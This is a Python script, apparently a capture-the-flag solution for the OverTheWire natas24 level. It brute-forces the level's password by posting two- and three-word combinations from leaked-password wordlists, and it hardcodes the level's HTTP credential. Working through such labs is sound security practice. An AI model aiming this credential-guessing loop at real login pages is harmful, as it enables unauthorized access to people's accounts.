import requests, itertools
from requests.auth import HTTPBasicAuth

comb = itertools.combinations_with_replacement
perm = itertools.permutations

uri = 'http://natas24.natas.labs.overthewire.org/'

f = open('passwords/darkweb2017-top10000.txt')
darkweb = (line.rstrip('\n') for line in f)
f = open('passwords/twitter-banned.txt')
twitter = (line.rstrip('\n') for line in f)
natas = ('natas'+str(i) for i in range(33))
nrs = (str(i) for i in range(33))

contains = 'iloveyou'

def reqpass( passwd ):
    if len(passwd) > 20:
        return
    else:
        print( passwd )
        p = requests.post( uri,
            auth=HTTPBasicAuth('natas24', 'OsRmXFguozKpTZZ5X14zNO43379LZveg'),
            data={'passwd' : passwd})
        if 'Wrong!' not in p.text:
            print( p.text )
            return 1
        return 0

for passwds in [natas,nrs,twitter,darkweb]:
    # for p in passwds:
    #     if reqpass(p):
    #         exit()
    for p in comb( passwds, 2):
        if reqpass(''.join(p)):
            exit()
    for p in comb( passwds, 3 ):
        if reqpass(''.join(p)):
            exit()
